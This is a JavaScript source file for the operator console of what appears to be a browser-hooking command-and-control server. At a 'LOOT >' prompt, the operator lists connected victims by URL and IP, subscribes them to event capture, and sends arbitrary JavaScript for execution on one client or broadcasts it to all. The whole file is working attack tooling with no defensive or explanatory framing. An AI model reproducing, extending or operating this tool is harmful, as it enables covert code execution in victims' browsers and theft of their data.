"use strict";

import process from 'process';
import * as readline from 'readline';
import { log } from './log.js';
import Client from './client.js';

/*
function getTargets(target, clients) {
  if (target === "all") {
    return [...clients.values()];
  } else {
    const clientId = parseInt(target, 10);
    if (isNaN(clientId)) {
      log.warn(`Invalid target id`);
      return [];
    }
    const client = clients.get(clientId);
    if (!client) {
      log.warn(`client=${clientId} not found`);
      return [];
    }
    return [client];
  }
}
*/
function getTarget(id, clients) {
  const clientId = parseInt(id, 10);
  if (isNaN(clientId)) {
    log.warn(`Invalid client id`);
    return null;
  }
  const client = clients.get(clientId);
  if (!client) {
    log.warn(`client=${clientId} not found`);
    return null;
  }
  return client;
}

function startRepl(clients) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    historySize: 100,
    prompt: "LOOT > ",
  });
  rl.prompt();
  rl.on("line", (line) => {
    const input = line.trim();
    if (!input) {
      rl.prompt();
      return;
    }
    const parts = input.split(/\s+/);
    const command = parts[0];
    const target = parts[1];
    const payload = parts.slice(2).join(' ');
    switch (command) {
      case "clients":
        if (clients.size === 0) {
          log.info("0 clients connected");
        } else {
          for (const client of clients.values()) {
            log.info(`${client.id} ${client.url} ${client.ip}`);
          }
        }
        break;
      case "subscribe":
      case "sub":
        {
          const eventType = parts[2];
          if (!target || !eventType) {
            log.warn("Usage: subscribe <id|all> <event>");
            break;
          }
          if (target === "all") {
            Client.broadcast(clients, "subscribe", eventType);
          } else {
            const client = getTarget(target, clients);
            if (client) {
              log.info(`Subscribing client=${client.id}:event:${eventType}`);
              client.send('subscribe', eventType);
            }
          }
        }
        break;
      case "unsubscribe":
      case "unsub":
        {
          const eventType = parts[2];
          if (!target || !eventType) {
            log.warn("Usage: unsubscribe <id|all> <event>");
            break;
          }
          if (target === "all") {
            // log.info(`Unsubscribing ALL from event=${eventType}`);
            Client.broadcast(clients, "unsubscribe", eventType);
          } else {
            const client = getTarget(target, clients);
            if (client) {
              log.info(`Unsubscribing client=${client.id}:event=${eventType}`);
              client.send('unsubscribe', eventType);
            }
          }
        }
        break;
      case "execute":
      case "exe":
        {
          if (!target || !payload) {
            log.warn("Usage: execute <id|all> <js>");
            break;
          }
          if (target === "all") {
            log.info(`Executing on ALL clients: ${payload}`);
            Client.broadcast(clients, 'execute', payload);
          } else {
            const client = getTarget(target, clients);
            if (client) {
              log.info(`Executing client=${client.id}:code=${payload}`);
              client.send('execute', payload);
            }
          }
        }
        break;
      case "help":
      case "h":
        console.log(`  clients       - List all connected clients
  execute <id|all> <js>  - Run js code on client(s)
  subscribe <id|all> <event> - Subscribe client(s) to a event');
  unsubscribe <id|all> <event> - Unsubscribe client(s) from event`);
        break;
      case "exit":
      case "quit":
        process.exit(0);
      default:
        log.warn(`Unknown command [${command}] target=${target} payload=${payload}`);
    }
    rl.prompt();
  }).on("close", () => {
    log.log("Exiting REPL");
    process.exit(0);
  });
}

export { startRepl };
